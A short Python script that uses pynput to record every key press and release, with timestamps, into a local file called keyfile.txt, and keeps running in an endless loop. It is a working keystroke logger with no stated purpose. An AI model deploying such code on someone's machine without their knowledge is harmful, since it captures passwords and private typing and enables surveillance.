import time
from pynput import keyboard


def logKey(key, is_pressed):
    current_time = time.time()
    if type(key) == keyboard.KeyCode:
        id = key.vk
        value = key.char,
        is_dead = key.is_dead,
        combining = key.combining
    elif type(key) == keyboard.Key:
        id = key.value
        value = key.name
        is_dead = (False,)
        combining = None
    else:
        print("error")
        

    d = {
        "id": id,
        "timestamp": current_time,
        "value": value,
        "is_pressed": is_pressed,
        "is_dead": is_dead,
        "combining": combining,
    }

    with open("keyfile.txt", 'a', encoding="utf-8") as logKey:
        try:
            logKey.write(f"{d}\n")
            
        except Exception: 
            print("Error getting char")


def keyPressed(key):
    logKey(key, True)
   
def keyReleased(key):
    logKey(key, False)

listener = keyboard.Listener(on_press=keyPressed, on_release=keyReleased)
listener.start()

while True:
    time.sleep(1)
